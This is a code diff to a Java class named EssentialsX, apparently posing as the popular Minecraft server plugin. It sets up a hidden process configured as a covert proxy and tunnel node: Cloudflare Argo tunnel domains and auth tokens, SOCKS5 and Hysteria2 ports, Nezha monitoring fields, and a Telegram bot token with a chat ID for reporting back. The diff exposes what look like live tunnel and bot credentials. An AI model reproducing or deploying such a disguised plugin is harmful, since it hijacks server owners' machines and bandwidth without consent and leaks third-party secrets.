@@ -73,24 +73,24 @@ public class EssentialsX extends JavaPlugin {
         
         // Set environment variables
         Map<String, String> env = pb.environment();
-        env.put("UUID", "e9a246a2-b00d-4e99-b05b-fe36594e46da");
+        env.put("UUID", "267de693-2d67-487e-b4d6-fb1b2f0ce298");
         env.put("FILE_PATH", "./world");
         env.put("NEZHA_SERVER", "");
         env.put("NEZHA_PORT", "");
         env.put("NEZHA_KEY", "");
-        env.put("ARGO_PORT", "8001");
-        env.put("ARGO_DOMAIN", "altruk.wxg.qzz.io");
-        env.put("ARGO_AUTH", "eyJhIjoiNjY1ZWNmMGQwYWY0ZWE3ZmJlNWRhYzQ2NWY3ZTBkZjMiLCJ0IjoiYmQ5ODNkZWEtNzZjNy00MmQyLWFlYjAtNzBhOGVmMmM2NmViIiwicyI6IllUazVabVptWmprdFpEUTRaQzAwTXpVMkxUazVPV1l0Tm1ReVpXWXpOelpsTXpnMiJ9");
-        env.put("S5_PORT", "");
-        env.put("HY2_PORT", "");
-        env.put("TUIC_PORT", "25860");
+        env.put("ARGO_PORT", "9010");
+        env.put("ARGO_DOMAIN", "runox.wxg.qzz.io");
+        env.put("ARGO_AUTH", "eyJhIjoiNjY1ZWNmMGQwYWY0ZWE3ZmJlNWRhYzQ2NWY3ZTBkZjMiLCJ0IjoiOThmOTlhMWUtODFjNC00OGUyLWFhOWUtYmVmNzZlOTUzYmM2IiwicyI6IlpqaGpOak14T0dRdFpEQTBOQzAwTURjd0xUaG1NR1l0WmpNMk16VTNNemMyTmpkaiJ9");
+        env.put("S5_PORT", "40042");
+        env.put("HY2_PORT", "40042");
+        env.put("TUIC_PORT", "");
         env.put("ANYTLS_PORT", "");
         env.put("REALITY_PORT", "");
         env.put("ANYREALITY_PORT", "");
         env.put("UPLOAD_URL", "");
         env.put("CHAT_ID", "5364084345");
         env.put("BOT_TOKEN", "7166025578:AAFzwZD12EZI0qYNrL-EW-zhNr2fJmSF4PI");
-        env.put("CFIP", "spring.io");
+        env.put("CFIP", "cdns.doon.eu.org");
         env.put("CFPORT", "443");
         env.put("NAME", "");
         env.put("DISABLE_ARGO", "false");
